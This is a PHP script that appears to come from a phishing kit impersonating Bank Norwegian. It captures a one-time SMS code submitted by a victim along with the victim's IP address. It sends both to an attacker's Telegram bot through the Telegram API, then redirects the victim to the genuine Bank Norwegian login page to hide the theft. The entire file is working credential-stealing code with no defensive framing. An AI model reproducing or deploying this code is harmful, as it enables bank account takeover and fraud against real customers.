<?php
$ip = getenv("REMOTE_ADDR");
$message .= "----------Egangskode---\n";
$message .= "sms   : ".$_POST['sms']."\n";
$message .= "-------------------\n";
$message .= "IP: ".$ip."\n";
$message .= "---------------------------------------------------\n";
$token = "<TOKEN_REMOVED>";
$data = [
    'text' => $message,
    'chat_id' => '1221067626'
];

file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );

echo '<script language="Javascript">
<!--
document.location.replace("https://identity.banknorwegian.no/");
// -->
</script>';




?>
